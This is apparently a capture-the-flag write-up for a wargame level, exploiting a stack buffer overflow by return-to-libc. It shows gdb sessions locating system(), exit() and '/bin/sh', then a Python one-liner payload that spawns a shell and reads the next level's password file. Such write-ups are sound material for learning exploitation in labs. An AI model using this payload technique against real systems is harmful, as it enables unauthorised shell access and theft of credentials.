

```
    (gdb) run
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /home/user/level2/level2 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? ()
```

Finding system()

```
   gdb) b main
   Breakpoint 1 at 0x8048542
   (gdb) r
   Starting program: /home/user/level2/level2 

   Breakpoint 1, 0x08048542 in main ()
   (gdb) p system
   $1 = {<text variable, no debug info>} 0xb7e6b060 <system>

```

Finding exit()

```
   p exit
   $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

Finding /bin/sh

```
   (gdb) info proc map
   process 2743
   Mapped address spaces:

   Start Addr   End Addr       Size     Offset objfile
   0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
   0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
   0xb7e2b000 0xb7e2c000     0x1000        0x0 
   0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fd2000 0xb7fd5000     0x3000        0x0 
   0xb7fdb000 0xb7fdd000     0x2000        0x0 
   0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
   0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
   0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
   0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
   0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

now we need to find the offset of string /bin/sh relative to the start of the libc binary:

```
   (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
   0xb7f8cc58
   1 pattern found
```

- Buffer overflow length: 80 bytes

- Address of system(): 0xb7e6b060 => \x60\xb0\xe6\xb7

- Address of exit(): 0xb7e5ebe0 => \xe0\xeb\xe5\xb7

- Address of "/bin/sh": 0xb7f8cc58 => \x58\xcc\xf8\xb7



python -c 'print("A"*80 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")' > /tmp/hh
(cat /tmp/hh; cat) | ./level2


cat /home/user/level2/.pass
